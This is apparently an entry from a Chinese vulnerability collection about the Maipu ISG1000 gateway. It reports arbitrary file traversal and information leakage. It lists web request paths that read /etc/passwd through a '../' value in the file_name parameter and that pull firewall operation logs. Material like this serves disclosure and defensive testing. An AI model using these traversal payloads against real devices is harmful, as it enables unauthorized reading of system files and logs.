##cve编号：无
##漏洞名称：任意文件遍历&敏感信息泄漏
##漏洞类型：
##影响版本：
- ISG1000 有2个版本,title伪迈普通信技术有限公司存在漏洞
##利用脚本：
- 无

##漏洞细节：
参考url：
/webui/?g=sys_dia_data_down&file_name=../etc/passwd
/webui/?g=sys_dia_data_check&file_name=../etc/passwd
/webui/?g=log_fw_operate_jsondata&date=&end_date=&content=&level_name=&admin=&admin_fuzzy=&log_ip=&page=1&rows=20
/webui/?g=log_fw_operate_jsondata&date=&end_date=&content=&level_name=&admin=&admin_fuzzy=&log_ip=&page=1&rows=20
##reference：
